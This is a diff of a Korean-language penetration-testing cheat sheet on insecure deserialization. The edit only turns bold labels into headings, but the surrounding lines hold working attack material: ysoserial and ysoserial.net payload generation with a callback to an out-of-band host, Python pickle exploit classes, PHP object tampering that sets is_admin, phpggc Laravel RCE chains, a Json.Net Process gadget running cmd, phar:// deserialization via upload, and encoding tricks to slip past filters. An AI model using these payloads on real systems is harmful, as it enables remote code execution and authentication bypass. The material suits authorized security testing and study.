@@ -1,6 +1,6 @@
 ### 정찰 페이로드
 
-**직렬화 sink 탐지 (요청/응답에서 시그니처):**
+#### 직렬화 sink 탐지 (요청/응답에서 시그니처)
 
 | 언어 | 시그니처 (Base64 / Hex) | 발견 위치 |
 |---|---|---|
@@ -21,7 +21,7 @@ curl -v "https://target/api/endpoint" 2>&1 | grep -iE "rO0AB|gASV|AAEAAAD|x-java
 
 ### 기본 페이로드
 
-**Java (ysoserial):**
+#### Java (ysoserial)
 ```bash
 # DNS callback (URLDNS chain — 의존성 불필요)
 java -jar ysoserial.jar URLDNS "https://CALLBACK.oast.fun/deser-java" | base64 -w0
@@ -49,7 +49,7 @@ curl -X POST "https://target/api/endpoint" \
   -H "Content-Type: application/octet-stream" --data-binary @payload.ser
 ```
 
-**Python pickle:**
+#### Python pickle
 ```python
 import pickle, base64
 class Exploit:
@@ -65,7 +65,7 @@ class TimeBomb:
         return (time.sleep, (5,))
 ```
 
-**PHP unserialize:**
+#### PHP unserialize
 ```php
 // 속성 변조 (단순 인증 우회)
 O:4:"User":2:{s:4:"name";s:4:"a";s:8:"is_admin";b:1;}
@@ -77,7 +77,7 @@ phpggc Laravel/RCE6 system "id" -b
 phpggc -l  # 사용 가능 chain 목록
 ```
 
-**.NET ViewState:**
+#### .NET ViewState
 ```bash
 # ysoserial.net (MAC 비활성 또는 machineKey 노출 시)
 ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter \
@@ -91,7 +91,7 @@ ysoserial.exe -g WindowsIdentity -f Json.Net \
   -c "cmd /c calc" -o base64
 ```
 
-**Ruby Marshal:**
+#### Ruby Marshal
 ```ruby
 # universal_rce gadget (Rails secret_key_base 노출 시)
 # 별도 도구 (rapid7/metasploit 모듈) 활용
@@ -109,7 +109,7 @@ ysoserial.exe -g WindowsIdentity -f Json.Net \
 {"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}
 ```
 
-**phar:// 간접 역직렬화 (PHP):**
+#### phar:// 간접 역직렬화 (PHP)
 ```bash
 # 1. malicious.phar 생성 (PHP gadget chain 포함)
 # 2. 업로드
@@ -131,7 +131,7 @@ curl "https://target/check?file=phar://uploaded.phar/x.txt"
 | 추상 클래스 allowlist | concrete subclass로 우회 |
 | Jackson `LaissezFaireSubTypeValidator` (2.10+) | 사실상 무필터 — `BasicPolymorphicTypeValidator` + `allowIfBaseType` 필요 |
 
-**인코딩 우회:**
+#### 인코딩 우회
 ```bash
 # Gzip 압축 후 Base64
 gzip -c payload.ser | base64 -w0
